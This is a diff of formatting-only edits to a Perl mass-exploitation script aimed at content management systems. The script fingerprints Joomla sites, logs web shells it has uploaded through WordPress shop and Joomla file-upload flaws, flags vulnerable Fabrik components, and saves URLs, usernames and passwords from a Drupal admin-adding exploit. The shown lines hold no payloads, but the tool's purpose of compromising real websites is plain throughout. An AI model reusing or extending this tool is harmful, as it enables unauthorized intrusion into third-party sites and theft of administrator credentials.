@@ -146,7 +146,7 @@ my $lokomediacmstow = $ua->get("$loko")->content;
 my $cms = $ua->get("$site")->content;
 
 if($cms =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!/) {
-print color('bold white'),"[$a] $site - ";
+    print color('bold white'),"[$a] $site - ";
     print color("bold green"), "Joomla\n\n\n";
     print color('reset');
     open(save, '>>tmp/joomla.txt');
@@ -1521,7 +1521,7 @@ print color('bold green')," [";
 print color('bold red'),"+";
 print color('bold green'),"] ";
 print color('bold white'),"Shell Uploaded Successfully\n";
-print color('bold white'),"  [Link] => $wpshopup\n";
+print color('bold white'),"  [Link] => $wpshopup\n\n";
 open (TEXT, '>>Result/Shells.txt');
 print TEXT "$wpshopup\n";
 close (TEXT);
@@ -1531,7 +1531,7 @@ print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"Wp Shop";
 print color('bold white')," ........................... ";
-print color('bold red'),"NOt VULN\n";
+print color('bold red'),"NOt VULN\n\n";
 }
 }
 # this exploit Content Injection coded by fallag gassrini <3
@@ -3017,7 +3017,7 @@ print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"Com Fabrik";
-print color('bold white')," ......................... ";
+print color('bold white')," ........................ ";
 print color('bold green'),"VULN\n";
 print color('bold green')," [";
 print color('bold red'),"+";
@@ -3032,7 +3032,7 @@ print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"Com Fabrik";
-print color('bold white')," ......................... ";
+print color('bold white')," ........................ ";
 print color('bold red'),"NOt VULN\n";
 }
 }
@@ -3097,7 +3097,7 @@ print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"Com Fabrik2";
-print color('bold white')," ..................... ";
+print color('bold white')," ....................... ";
 print color('bold green'),"VULN\n";
 print color('bold green')," [";
 print color('bold red'),"+";
@@ -3112,7 +3112,7 @@ print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"Com Fabrik2";
-print color('bold white')," ..................... ";
+print color('bold white')," ....................... ";
 print color('bold red'),"NOt VULN\n";
 }
 }
@@ -3137,7 +3137,7 @@ print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"Com Fabrik Index2";
-print color('bold white')," .................. ";
+print color('bold white')," ................. ";
 print color('bold green'),"VULN\n";
 print color('bold green')," [";
 print color('bold red'),"+";
@@ -3152,7 +3152,7 @@ print color('bold red'),"[";
 print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"Com Fabrik2 Index";
-print color('bold white')," .................. ";
+print color('bold white')," ................. ";
 print color('bold red'),"NOt VULN\n";
 }
 }
@@ -3375,7 +3375,7 @@ print color('bold green')," [";
 print color('bold red'),"+";
 print color('bold green'),"] ";
 print color('bold white'),"Shell Uploaded Successfully\n";
-print color('bold white'),"  [Link] => $simplefileuploadsup\n";
+print color('bold white'),"  [Link] => $simplefileuploadsup\n\n";
 open (TEXT, '>>Result/shells.txt');
 print TEXT "$simplefileuploadsup\n";
 close (TEXT);
@@ -3385,7 +3385,7 @@ print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"mod_simplefileupload";
 print color('bold white')," .............. ";
-print color('bold red'),"NOt VULN\n";
+print color('bold red'),"NOt VULN\n\n";
 }
 }
 ##########################################################
@@ -3420,7 +3420,7 @@ print color('bold white'),"PASS : $pass\n";
 open (TEXT, '>>Result/drupal.txt');
 print TEXT "\nURL : $dr\n";
 print TEXT "USER : $admin\n";
-print TEXT "PASS : $pass\n";
+print TEXT "PASS : $pass\n\n";
 close (TEXT);
 }else{
 print color('bold red'),"[";
@@ -3428,6 +3428,6 @@ print color('bold green'),"+";
 print color('bold red'),"] ";
 print color('bold white'),"Drupal Add Admin";
 print color('bold white')," ................... ";
-print color('bold red'),"NOt VULN\n";
+print color('bold red'),"NOt VULN\n\n";
 }
 }
